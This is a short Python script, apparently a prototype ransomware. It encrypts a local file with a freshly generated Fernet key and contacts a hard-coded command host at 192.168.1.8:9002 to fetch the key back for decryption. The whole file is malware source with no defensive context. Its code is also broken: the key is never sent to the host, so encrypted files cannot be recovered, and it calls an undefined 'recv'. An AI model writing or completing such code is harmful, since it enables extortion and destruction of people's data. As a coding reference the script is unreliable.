from cryptography.fernet import Fernet
import os
import sys
import socket
import requests
        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "192.168.1.8"
port = 9002

def encrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted = file.read()
    decrypted = f.decrypt(encrypted)
    with open(filename, "wb") as file:
        file.write(decrypted)

def main():
    
    file = "file.txt"

    option = sys.argv[1]

    if option == "-e":
        s.connect((host, port))
        key = Fernet.generate_key()
        key = key
        encrypt(file, key)

    elif option == "-d":
        s.connect((host, port))
        str = bytes("request_key", "utf-8")
        s.send(str)
        key = recv(1024)
        key = key.decode("utf-8")
        decrypt(file, key)
        key = 0

if __name__ == "__main__":
    main()
        

